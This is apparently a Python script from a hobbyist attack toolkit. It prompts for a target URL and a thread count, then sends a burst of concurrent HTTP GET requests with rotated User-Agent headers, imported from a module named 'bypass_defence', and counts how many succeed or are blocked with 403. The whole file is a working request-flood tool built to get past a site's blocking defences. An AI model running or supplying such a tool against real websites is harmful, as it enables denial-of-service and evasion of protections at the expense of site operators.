import asyncio
import aiohttp
import os
import random
from bypass_defence.user import *
from LOGO.logo import *
from SYSTEM.color import *
from SYSTEM.slowprint import *



os.system("clear")

print(red + "")
slowprint(logo)

print(green + " ||")

URL = input(green+" ||===="+red+"Enter=URL"+green+"=========$  "+white)
MAX_CONCURRENT = int(input(green+" ||==="+red+"Number"+green+"="+red+"of"+green+"="+red+"thread"+green+"===$  "+white))



async def smart_fetch(session, semaphore):
    async with semaphore:
        headers = {
            "User-Agent": random.choice(UA_LIST),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        }
        try:

            async with session.get(URL, headers=headers, timeout=5) as response:
                return response.status
        except:
            return "Fail"

async def main():
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    async with aiohttp.ClientSession() as session:
        tasks = [smart_fetch(session, sem) for _ in range(200)]
        print(green+"["+red+"*"+green+"]"+red+" Blasting with Smart Headers...")
        results = await asyncio.gather(*tasks)
        

        success = results.count(200)
        forbidden = results.count(403)
        print(f"\n--- Results ---")
        print(green+"["+red+"+"+green+"]"+red+"Success (200): ")
        print(success)
        print(green+"["+red+"!"+green+"]"+red+"Blocked (403): ")
        print(forbidden)

        if MAX_CONCURRENT != success + forbidden:
            print()
            print(green+"["+red+"!"+green+"]"+red+"ALL THREAD NOT SEND MAYBE DUE TO LOW INTERNET SPEED")

if __name__ == "__main__":
    asyncio.run(main())
